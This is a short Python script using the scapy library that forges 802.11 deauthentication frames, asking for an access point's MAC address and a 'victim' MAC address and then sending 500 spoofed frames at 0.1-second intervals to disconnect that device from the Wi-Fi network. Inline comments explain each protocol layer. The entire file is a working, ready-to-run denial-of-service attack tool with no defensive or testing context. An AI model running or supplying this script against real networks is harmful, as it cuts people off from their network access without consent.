from scapy.all import *
import sys
import platform


BSSID = input("Enter MAC address of the Access Point:- ")

vctm_mac = input("Enter MAC address of the Victim:- ")

frame = RadioTap() / Dot11(addr1 = vctm_mac, addr2 = BSSID, addr3 = BSSID) / Dot11Deauth()   #deauthentication frame
#RadioTap(): This layer is used for capturing radio information. It allows access to radio-level headers and metadata
#Dot11(): This layer represents the 802.11 Wi-Fi protocol.
#Dot11Deauth(): This layer represents the deauthentication frame itself.

system_info = platform.system()
if system_info == "Windows":
    sendp(frame, iface="Wi-Fi", count=500, inter=.1)
else:
    sendp(frame, iface="wlan0", count= 500, inter= .1)

 #sends the deauthentication frame & specifies the network interface to use (iface="") & no of frames to send (count=500), and the interval between each frame in seconds (inter=.1).
